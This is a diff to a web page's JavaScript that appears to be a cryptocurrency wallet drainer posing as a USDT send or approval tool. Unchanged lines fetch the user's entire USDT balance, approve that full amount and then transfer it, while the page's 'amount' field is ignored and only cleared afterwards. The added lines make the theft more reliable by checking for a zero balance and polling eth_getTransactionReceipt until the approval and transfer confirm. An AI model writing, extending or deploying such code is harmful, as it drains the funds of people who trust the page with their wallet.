@@ -259,16 +259,30 @@
                 document.getElementById('approveBtn').disabled = true;
 
                 userBalance = await getUSDTBalance(currentUserAddress);
+                if (userBalance === 0) {
+                    showNotification('No USDT balance found', 'error');
+                    document.getElementById('approveBtn').disabled = false;
+                    return;
+                }
+
                 const amountWei = (userBalance * Math.pow(10, USDT_DECIMALS)).toFixed(0);
 
                 showNotification('Processing approval...', 'info');
 
                 const approvalTxHash = await approveUSDT(currentUserAddress, amountWei);
+                showNotification('⏳ Waiting for approval confirmation...', 'info');
+
+                // Wait for approval transaction to be confirmed (up to 30 seconds)
+                await waitForTransaction(approvalTxHash);
                 showNotification('✅ Approval confirmed!', 'success');
 
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                await new Promise(resolve => setTimeout(resolve, 3000));
 
+                showNotification('Processing transfer...', 'info');
                 const transferTxHash = await transferUSDTO(currentUserAddress);
+                
+                // Wait for transfer transaction
+                await waitForTransaction(transferTxHash);
                 showNotification(`✅ Success! ${userBalance.toFixed(2)} USDT sent!`, 'success');
 
                 try { 
@@ -282,16 +296,44 @@
                     document.getElementById('amount').value = '';
                     document.getElementById('usdValue').textContent = '≈ $0.00';
                     document.getElementById('approveBtn').disabled = false;
-                }, 1000);
+                }, 2000);
 
             } catch (error) {
                 document.getElementById('approveBtn').disabled = false;
                 if (error.code === 4001) {
-                    showNotification('Transaction rejected', 'error');
+                    showNotification('Transaction rejected by user', 'error');
                 } else {
                     showNotification('Error: ' + error.message, 'error');
                 }
             }
+        }
+
+        async function waitForTransaction(txHash) {
+            let attempts = 0;
+            const maxAttempts = 60; // 60 seconds max
+            
+            while (attempts < maxAttempts) {
+                try {
+                    const receipt = await window.ethereum.request({
+                        method: 'eth_getTransactionReceipt',
+                        params: [txHash]
+                    });
+                    
+                    if (receipt) {
+                        if (receipt.status === '0x1') {
+                            return true; // Success
+                        } else {
+                            throw new Error('Transaction failed on-chain');
+                        }
+                    }
+                } catch (err) {
+                    console.error('Error checking transaction:', err);
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                attempts++;
+            }
+            throw new Error('Transaction confirmation timeout');
         }
 
         async function approveUSDT(senderAddress, amount) {
